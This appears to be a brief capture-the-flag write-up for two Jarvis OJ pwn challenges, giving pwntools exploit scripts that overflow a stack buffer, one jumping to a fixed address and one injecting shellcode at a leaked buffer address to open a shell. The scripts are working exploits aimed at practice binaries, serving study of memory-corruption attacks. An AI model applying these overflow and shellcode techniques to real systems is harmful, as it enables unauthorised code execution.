# Write up 0709

## [XMAN]level0

exp:  

```python
from pwn import *
#n = process('./level0')
n = remote('pwn2.jarvisoj.com', 9881)
print(n.recvline())
n.sendline('a'*(0x80+8) + 2*p64(0x400596))
n.interactive()
```



## [XMAN]level1

### 分析：

在vulnerable_function()中，read(0, &buf, 0x100u);存在栈溢出，观察栈推断出偏移量为0x88+4  

上一行中的 printf("What's this:%p?\n", &buf);输出了buf的地址，于是在buf中写入shellcode并溢出跳转回buf的初始地址执行shellcode

### exp:

```python
from pwn import *
#n = process('./level1')
n = remote('pwn2.jarvisoj.com', 9877)

offset = 0x88 + 4

n.recvuntil("What's this:")
buf_addr = n.recvuntil('?')[:-1]
print "buf_addr=" + buf_addr
buf_addr = int(buf_addr,16)
shellcode = asm(shellcraft.sh())

payload = shellcode
payload = (shellcode.ljust(offset,'a'))
payload += p32(buf_addr)

n.sendline(payload)
n.interactive()
```

